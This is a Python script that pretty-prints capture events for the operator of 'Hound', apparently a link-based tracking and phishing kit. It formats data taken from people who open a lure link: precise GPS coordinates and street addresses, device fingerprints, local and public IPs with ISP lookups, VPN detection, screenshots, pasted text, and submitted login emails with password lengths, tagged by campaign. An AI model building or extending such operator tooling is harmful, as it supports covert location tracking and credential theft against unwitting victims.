#!/usr/bin/env python3
"""Pretty-print Hound capture events for the operator terminal."""

from __future__ import print_function

import argparse
import json
import os
import sys
import time
from datetime import datetime

WIDTH = 72
VERBOSE = os.environ.get("HOUND_VERBOSE", "").strip().lower() in ("1", "true", "yes")


def _env_flag(name):
    return os.environ.get(name, "").strip().lower() in ("1", "true", "yes")


def _configure_stdout():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


_configure_stdout()
USE_COLOR = sys.stdout.isatty() and not _env_flag("NO_COLOR")


def _supports_unicode():
    if _env_flag("HOUND_ASCII"):
        return False
    encoding = getattr(sys.stdout, "encoding", None) or "ascii"
    try:
        "┌─┐│└┘…·".encode(encoding)
        return True
    except Exception:
        return False


UNICODE = _supports_unicode()
TL, TR, BL, BR, H, V, ELLIPSIS, DOT = (
    ("┌", "┐", "└", "┘", "─", "│", "…", " · ") if UNICODE
    else ("+", "+", "+", "+", "-", "|", "...", " | ")
)

QUIET_EVENTS = {"behavior"}

LABELS = {
    "link_open": "LINK OPEN",
    "fingerprint": "DEVICE",
    "location": "GPS",
    "location_update": "GPS UPDATE",
    "location_error": "GPS DENIED",
    "chat_message": "CHAT",
    "credential_capture": "LOGIN SUBMIT",
    "webrtc_local_ips": "LOCAL IPS",
    "session_end": "SESSION END",
    "return_visit_beacon": "RETURN VISIT",
    "screenshot": "SCREENSHOT",
    "paste": "PASTE",
    "device_orientation": "ORIENTATION",
    "notification_permission": "NOTIFY PERM",
}

if USE_COLOR:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
else:
    RESET = BOLD = DIM = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = GRAY = ""

EVENT_COLOR = {
    "link_open": GREEN,
    "fingerprint": CYAN,
    "location": GREEN,
    "location_update": GREEN,
    "location_error": YELLOW,
    "chat_message": BLUE,
    "credential_capture": MAGENTA,
    "session_end": GRAY,
    "return_visit_beacon": YELLOW,
    "screenshot": DIM,
    "paste": YELLOW,
    "webrtc_local_ips": CYAN,
    "device_orientation": DIM,
    "notification_permission": DIM,
}


def clip(text, size):
    text = " ".join(str(text).split())
    if len(text) <= size:
        return text
    return text[: max(0, size - len(ELLIPSIS))] + ELLIPSIS


def pick(data, *path):
    cur = data
    for key in path:
        if not isinstance(cur, dict) or key not in cur:
            return None
        cur = cur[key]
    if cur in (None, "", [], {}):
        return None
    return cur


def fmt_time(value):
    if not value:
        return datetime.now().strftime("%H:%M:%S")
    try:
        stamp = str(value).replace("Z", "+00:00")
        return datetime.fromisoformat(stamp).astimezone().strftime("%H:%M:%S")
    except Exception:
        return clip(value, 8)


def row(label, value, value_width=None):
    if value in (None, "", [], {}):
        return None
    if isinstance(value, float):
        value = "{:.6f}".format(value).rstrip("0").rstrip(".")
    label_w = 12
    max_val = (value_width or (WIDTH - 6 - label_w))
    return "  {}{:<12}{}{}".format(DIM, label, RESET, clip(value, max_val))


def visible_len(text):
    return len(_strip_ansi(text))


def box(title, lines, timestamp=None, color=None):
    color = color or CYAN
    inner = WIDTH - 2
    left = " {} ".format(title)
    right = " {} ".format(fmt_time(timestamp))
    fill = max(1, inner - len(left) - len(right))
    top = "  {g}{tl}{c}{left}{g}{fill}{d}{right}{g}{tr}{r}".format(
        g=GRAY,
        c=BOLD + color,
        left=left,
        fill=H * fill,
        d=DIM,
        right=right,
        tl=TL,
        tr=TR,
        r=RESET,
    )
    body = []
    for line in lines:
        if not line:
            continue
        content = line[2:] if line.startswith("  ") else line
        pad = max(0, inner - 2 - visible_len(content))
        body.append("  {g}{v}{r} {content}{pad} {g}{v}{r}".format(
            g=GRAY,
            r=RESET,
            content=content,
            pad=" " * pad,
            v=V,
        ))
    bottom = "  {g}{bl}{fill}{br}{r}".format(g=GRAY, fill=H * inner, bl=BL, br=BR, r=RESET)
    return "\n".join([top] + body + [bottom])


def _strip_ansi(text):
    result = []
    skip = False
    for ch in text:
        if ch == "\033":
            skip = True
            continue
        if skip:
            if ch == "m":
                skip = False
            continue
        result.append(ch)
    return "".join(result)


def join_parts(*parts, sep=None):
    if sep is None:
        sep = DOT
    values = [str(p) for p in parts if p not in (None, "", [])]
    return sep.join(values) if values else None


def geo_line(event):
    enrich = pick(event, "server", "ip_enrichment") or {}
    return join_parts(
        pick(enrich, "city"),
        pick(enrich, "regionName"),
        pick(enrich, "country"),
    )


def format_event(event):
    if not isinstance(event, dict):
        return None

    kind = event.get("event_type") or "event"
    if kind in QUIET_EVENTS and not VERBOSE:
        return None

    title = LABELS.get(kind, kind.replace("_", " ").upper())
    color = EVENT_COLOR.get(kind, CYAN)
    stamp = event.get("received_at") or event.get("captured_at")
    session = clip(event.get("session_id") or "n/a", 36)
    ip = pick(event, "server", "server_ip")
    lines = [row("Session", session), row("IP", join_parts(ip, geo_line(event)))]

    if kind == "link_open":
        enrich = pick(event, "server", "ip_enrichment") or {}
        lines += [
            row("ISP", pick(enrich, "isp") or pick(enrich, "org")),
            row("ASN", pick(enrich, "as")),
            row("Campaign", event.get("campaign_id") or event.get("link_variant")),
            row("Agent", pick(event, "server", "user_agent")),
        ]
    elif kind == "fingerprint":
        screen = pick(event, "screen") or {}
        screen_s = None
        if screen:
            screen_s = "{}x{} @{}".format(
                screen.get("width"), screen.get("height"), screen.get("device_pixel_ratio")
            )
        ua = event.get("user_agent") or pick(event, "server", "user_agent")
        lines += [
            row("Platform", join_parts(event.get("platform"), event.get("vendor"))),
            row("Timezone", event.get("timezone")),
            row("Screen", screen_s),
            row("CPU/RAM", join_parts(
                "{} cores".format(event["hardware_concurrency"]) if event.get("hardware_concurrency") else None,
                "{} GB".format(event["device_memory_gb"]) if event.get("device_memory_gb") else None,
            )),
            row("Lang", join_parts(event.get("language"), ",".join(event.get("languages") or [])[:40])),
            row("Webdriver", event.get("webdriver")),
            row("Score", join_parts(
                "human {}".format(event["human_score"]) if event.get("human_score") is not None else None,
                "risk {}".format(event["risk_score"]) if event.get("risk_score") is not None else None,
            )),
            row("Agent", ua),
        ]
    elif kind in ("location", "location_update"):
        coords = pick(event, "coordinates") or {}
        lat, lon = coords.get("latitude"), coords.get("longitude")
        acc = coords.get("accuracy")
        coord_s = None
        if lat is not None and lon is not None:
            coord_s = "{}, {}".format(lat, lon)
            if acc is not None:
                try:
                    coord_s += "  ±{:.0f} m".format(float(acc))
                except (TypeError, ValueError):
                    coord_s += "  ±{} m".format(acc)
        addr = pick(event, "address", "display_name")
        mismatch = pick(event, "ip_gps_mismatch") or {}
        lines += [
            row("Coords", coord_s),
            row("Address", addr),
            row("Map", event.get("map_link")),
            row("VPN?", "likely ({} km from IP geo)".format(mismatch["distance_km"]) if mismatch.get("likely_vpn") else None),
            row("Score", join_parts(
                "human {}".format(event["human_score"]) if event.get("human_score") is not None else None,
                "risk {}".format(event["risk_score"]) if event.get("risk_score") is not None else None,
            )),
        ]
    elif kind == "location_error":
        lines += [
            row("Error", join_parts(event.get("error") or event.get("error_message"), "code {}".format(event["error_code"]) if event.get("error_code") is not None else None)),
            row("Retry", event.get("retry_count")),
        ]
    elif kind == "chat_message":
        chat = pick(event, "chat") or {}
        lines += [
            row("Role", chat.get("role")),
            row("Message", chat.get("text")),
        ]
    elif kind == "credential_capture":
        creds = pick(event, "credentials") or {}
        password = creds.get("password")
        pw_len = creds.get("password_length")
        if pw_len is None and password is not None:
            pw_len = len(str(password))
        if pw_len:
            mark = "*" if not UNICODE else "•"
            masked = mark * min(int(pw_len), 16) + " ({} chars)".format(pw_len)
        else:
            masked = "(hidden)"
        lines += [
            row("Email", creds.get("email")),
            row("Password", masked),
        ]
    elif kind == "webrtc_local_ips":
        ips = event.get("local_ips") or []
        lines.append(row("Hosts", ", ".join(str(i) for i in ips)))
    elif kind == "session_end":
        ms = event.get("total_time_on_page_ms")
        lines.append(row("Duration", "{:.1f}s".format(ms / 1000.0) if isinstance(ms, (int, float)) else ms))
    elif kind == "screenshot":
        blob = event.get("screenshot_base64") or ""
        lines.append(row("Capture", "{} chars".format(len(blob))))
    elif kind == "paste":
        pasted = event.get("pasted_text") or ""
        lines.append(row("Length", "{} chars".format(len(pasted))))
        if VERBOSE and pasted:
            lines.append(row("Preview", clip(pasted, 48)))
    elif kind == "device_orientation":
        lines.append(row("Axes", join_parts(
            "alpha {}".format(event.get("alpha")),
            "beta {}".format(event.get("beta")),
            "gamma {}".format(event.get("gamma")),
        )))
    elif kind == "notification_permission":
        lines.append(row("State", event.get("permission")))
    elif kind == "return_visit_beacon":
        lines.append(row("Local", "yes" if event.get("return_visitor_local") else None))
    else:
        # Compact unknown events instead of dumping JSON.
        skip = {
            "event_type", "session_id", "received_at", "captured_at", "server",
            "page_url", "url_params", "time_on_page_ms"
        }
        extras = []
        for key, value in event.items():
            if key in skip or isinstance(value, (dict, list)):
                continue
            extras.append("{}={}".format(key, value))
        if extras:
            lines.append(row("Data", ", ".join(extras)))

    lines = [line for line in lines if line]
    if not lines:
        return None
    return box(title, lines, timestamp=stamp, color=color)


def format_ip_file(path):
    ip = None
    extra = {}
    ua = None
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            for line in handle:
                line = line.strip()
                if line.startswith("IP:"):
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[1]
                    if "User-Agent:" in line:
                        ua = line.split("User-Agent:", 1)[1].strip()
                elif line.startswith("EXTRA:"):
                    raw = line.split("EXTRA:", 1)[1].strip()
                    try:
                        extra = json.loads(raw)
                    except json.JSONDecodeError:
                        extra = {}
    except OSError:
        return None

    enrich = extra.get("ip_enrichment") or {}
    lines = [
        row("IP", join_parts(ip, join_parts(enrich.get("city"), enrich.get("country")))),
        row("ISP", enrich.get("isp") or enrich.get("org")),
        row("Agent", ua or extra.get("user_agent")),
    ]
    return box("VISITOR", [line for line in lines if line], color=GREEN)


def emit(text):
    if not text:
        return
    try:
        print(text)
        print()
        sys.stdout.flush()
    except UnicodeEncodeError:
        safe = _strip_ansi(text).encode("ascii", "replace").decode("ascii")
        print(safe)
        print()
        sys.stdout.flush()


def follow_file(path):
    print("  {}listening for events...{}".format(DIM, RESET))
    sys.stdout.flush()
    while not os.path.exists(path):
        time.sleep(0.2)
    handle = open(path, "r", encoding="utf-8", errors="replace")
    try:
        handle.seek(0, os.SEEK_END)
        while True:
            line = handle.readline()
            if line:
                handle_line(line)
                continue
            try:
                size = os.path.getsize(path)
            except OSError:
                time.sleep(0.2)
                continue
            if handle.tell() > size:
                handle.close()
                handle = open(path, "r", encoding="utf-8", errors="replace")
            time.sleep(0.2)
    finally:
        handle.close()


def handle_line(line):
    line = line.strip()
    if not line:
        return
    try:
        event = json.loads(line)
    except json.JSONDecodeError:
        emit("  {}{}{}".format(DIM, clip(line, WIDTH), RESET))
        return
    emit(format_event(event))


def main():
    parser = argparse.ArgumentParser(description="Format Hound terminal events")
    parser.add_argument("--follow", metavar="FILE", help="Follow a JSONL event file")
    parser.add_argument("--ip", metavar="FILE", help="Pretty-print ip.txt")
    args = parser.parse_args()

    if args.ip:
        emit(format_ip_file(args.ip))
        return
    if args.follow:
        try:
            follow_file(args.follow)
        except KeyboardInterrupt:
            return
        return
    for line in sys.stdin:
        handle_line(line)


if __name__ == "__main__":
    main()
